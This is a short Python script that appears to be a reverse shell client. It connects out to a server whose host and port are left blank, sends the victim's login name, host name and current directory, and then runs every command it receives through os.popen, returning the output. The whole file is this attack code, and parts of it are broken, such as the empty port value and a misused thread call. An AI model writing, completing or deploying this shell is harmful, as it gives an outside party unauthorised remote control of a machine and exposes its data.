import socket
import os
import platform
import threading
from time import sleep
form = 'utf-8'
server = ''
port = 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))


reply = ' '
length = ' '

def sysinfo():
	info = f'{os.getlogin()}@{platform.node()}\n{os.getcwd()}'
	s.send(info.encode(form))
	sleep(0.1)

def sendlen():
	global length, reply
	length = len(reply)
	length = ' ' * length + ' ' * 16
	s.send(length.encode(form))
	sleep(0.8)
x = 1
while x == 1:
	sleep(0.1)
	thread = threading.Thread(sysinfo())
	thread.start()
	sleep(0.3)
	cmd = s.recv(512).decode(form)
	if cmd == 'cd':
		arg = s.recv(512).decode(form)
		print(arg)
		os.chdir(arg)
	else:
		reply = os.popen(cmd)
		reply = reply.read()
		sleep(0.3)
		sendlen()
		s.send(reply.encode(form))
		
